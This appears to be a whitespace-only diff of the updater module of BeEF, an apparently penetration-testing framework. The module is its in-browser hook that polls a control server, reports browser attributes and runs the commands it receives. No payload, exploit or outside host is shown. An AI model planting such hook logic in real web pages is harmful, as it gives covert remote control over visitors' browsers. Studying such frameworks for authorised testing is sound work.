@@ -12,28 +12,28 @@
  * websocket.ls is used instead.
  */
 beef.updater = {
-	
+
 	// XHR-polling timeout.
     xhr_poll_timeout: "<%= @xhr_poll_timeout %>",
     beefhook: "<%= @hook_session_name %>",
-	
+
 	// A lock.
 	lock: false,
-	
+
 	// An object containing all values to be registered and sent by the updater.
 	objects: new Object(),
-	
+
 	/*
 	 * Registers an object to always send when requesting new commands to the framework.
 	 * @param: {String} the name of the object.
 	 * @param: {String} the value of that object.
-	 * 
+	 *
 	 * @example: beef.updater.regObject('java_enabled', 'true');
 	 */
 	regObject: function(key, value) {
 		this.objects[key] = escape(value);
 	},
-	
+
 	// Checks for new commands from the framework and runs them.
 	check: function() {
 		if(this.lock == false) {
@@ -50,7 +50,7 @@ beef.updater = {
         /* The following gives a stupid syntax error in IE, which can be ignored*/
         setTimeout(function(){beef.updater.check()}, beef.updater.xhr_poll_timeout);
 	},
-	
+
     /**
      * Gets new commands from the framework.
      */
@@ -67,7 +67,7 @@ beef.updater = {
 		}
 		this.lock = false;
 	},
-	
+
     /**
      * Executes the received commands, if any.
      */
